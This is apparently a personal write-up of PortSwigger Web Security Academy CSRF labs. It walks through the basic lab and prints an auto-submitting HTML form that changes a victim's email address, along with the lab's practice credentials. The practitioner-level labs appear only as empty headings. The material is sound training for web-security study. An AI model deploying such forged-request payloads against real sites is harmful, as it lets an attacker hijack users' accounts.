# Cross-site request forgery (CSRF)

## Basics

### CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF. To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server. You can log in to your own account using the following credentials: `wiener:peter` 

----

1. Log in and intercept updating email (which is vulnerable):

![Simple CSRF](../../_static/images/csrf-simple1.png)

2. To create the exploit, put the correct parameters in the template given in [Cross-site request forgery (CSRF)](https://portswigger.net/web-security/csrf):

```text
<html>
    <body>
        <form action="https://0abe00ae04c3c7a8c1a5356100cc00d2.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

3. Paste the exploit in the `body` field of the exploit server form (link to exploit server is up top):

![Simple CSRF](../../_static/images/csrf-simple2.png)

4. To verify that the exploit works, try it by clicking **View exploit**, turning intercept on again, and checking the resulting HTTP request and response. 
5. Click **Deliver to victim** to solve the lab. 

## Practitioner

### CSRF where token validation depends on request method

### CSRF where token validation depends on token being present

### CSRF where token is not tied to user session

### CSRF where token is tied to non-session cookie

### CSRF where token is duplicated in cookie

### CSRF where Referer validation depends on header being present

### CSRF with broken Referer validation